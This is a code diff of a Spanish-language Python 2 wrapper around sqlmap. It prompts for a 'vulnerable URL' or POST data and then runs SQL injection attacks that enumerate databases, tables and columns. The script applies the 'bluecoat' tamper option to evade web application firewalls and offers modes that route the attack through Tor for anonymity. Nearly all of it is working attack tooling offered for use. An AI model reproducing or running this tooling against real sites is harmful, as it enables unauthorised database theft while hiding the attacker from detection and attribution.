@@ -20,13 +20,13 @@ def rsk():
         global risk
         risk=int(raw_input("Introduce tu valor para --risk (1-3): "))
         if risk < 1 or risk > 3:
-            checker.cRojo("El valor solo puede ser de 1 a 3.")
+            checker.cRojo("El valor solo puede ser de 1 a 3.\n")
             rsk()
         else:
             risk=str(risk)
             return risk
     except ValueError:
-        checker.cRojo("Por favor, el valor solo puede ser numerico.")
+        checker.cRojo("Por favor, el valor solo puede ser numerico.\n")
         rsk()
     except KeyboardInterrupt:
         print "Saliendo."
@@ -36,69 +36,91 @@ def lev():
         global level
         level=int(raw_input("Introduce tu valor para --level (1-5): "))
         if level < 1 or level > 5:
-            checker.cRojo("El valor solo puede ser de 1 a 5.")
+            checker.cRojo("El valor solo puede ser de 1 a 5.\n")
             lev()
         else:
             level=str(level)
             return level
     except ValueError:
-        checker.cRojo("Por favor, el valor solo puede ser numerico.")
+        checker.cRojo("Por favor, el valor solo puede ser numerico.\n")
         lev()
     except KeyboardInterrupt:
-        print "Saliendo."
+        print "Saliendo.\n"
       
+def urlglob():
+    global url
+    url=raw_input("introduce la url vulnerable: ")
+    if url != "" and "?" in url:
+        return url
+    elif url == "":
+        checker.cRojo("La URL está vacia, intentelo de nuevo.\n")
+        urlglob()
+    elif "?" not in url:
+        checker.cRojo("Necesitas introducir un parametro inyectable por ejemplo '?id', intentalo de nuevo.\n")
+        urlglob()
+    else:
+        checker.cRojo("Tu URL es invalida, por favor intentalo de nuevo.\n")
+        urlglob()
+
+def postglob():
+    global post
+    post=raw_input("introduce los datos post para la inyeccion sqli: ")
+    if post != "":
+        return post
+    elif post == "":
+        checker.cRojo("Los datos de POST inyeccion están vacios, intentelo de nuevo.\n")
+        postglob()
+    else:
+        checker.cRojo("Los datos post son invalidos, intentalo de nuevo.\n")
+        postglob()
+
 def sqlinorm():
-    global url
-    url=raw_input("introduce la url vulnerable a sqli: ")
-    if url != "":
-        lev()
-        rsk()
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
-        postsqli()
-    else:
-        sqlinorm()
+    urlglob()
+    lev()
+    rsk()
+    subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
+    postsqli()
+    
 def sqlitor():
-    global url
-    url=raw_input("introduce la url vulnerable a sqli: ")
-    if url != "":
-        lev()
-        rsk()
-        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
-        postsqli()
-    else:
-        sqlitor()
+    urlglob()
+    lev()
+    rsk()
+    subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
+    postsqli()
 
 def sqlipost():
     global url
-    url=raw_input("introduce la url vulnerable a sqli: ")
-    global post
-    post=raw_input("introduce los datos post para la inyeccion sqli: ")
-    if url != "" and post != "":
+    url=raw_input("introduce la url vulnerable: ")
+    if url != "":
+        postglob()
         lev()
         rsk()
         subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
         postsqli()
     else:
+        checker.cRojo("La URL esta vacia, intentalo de nuevo.\n")
         sqlipost()
 
 def sqlipostor():
     global url
-    url=raw_input("introduce la url vulnerable a sqli: ")
-    global post
-    post=raw_input("introduce los datos post para la inyeccion sqli: ")
-    if url != "" and post != "":
+    url=raw_input("introduce la url vulnerable: ")
+    if url != "":
+        postglob()
         lev()
         rsk()
         subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
         postsqli()
     else:
+        checker.cRojo("La URL esta vacia, intentalo de nuevo.\n")
         sqlipostor()
+
 def postdb():
     db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
     if db != "":
         subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"--tables"])
     else:
         postdb()
+
 def posttables():
     db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
     table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
@@ -106,6 +128,7 @@ def posttables():
         subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"--columns"])
     else:
         posttables()
+
 def postcolumns():
     db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
     table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
